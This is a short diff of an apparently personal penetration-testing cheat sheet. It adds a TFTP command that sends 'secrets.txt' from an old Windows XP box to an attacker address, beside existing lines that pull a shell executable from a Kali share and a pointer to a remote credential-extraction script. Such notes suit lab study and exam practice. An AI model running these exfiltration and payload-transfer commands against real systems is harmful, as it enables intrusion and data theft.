@@ -294,6 +294,10 @@ ____
      net use \\IP\share /USER:USER PASS    
      copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
      copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
+## Old Boxes (Windows XP)  
+TFTP usually enabled 
+metasploit tfp server module on Kali
+tftp -i 192.168.119.10 PUT secrets.txt
      
 ## Remote Scripts  
 [lsassy](https://github.com/PowerShellMafia/PowerSploit): script to extract creds remotely using impacket  
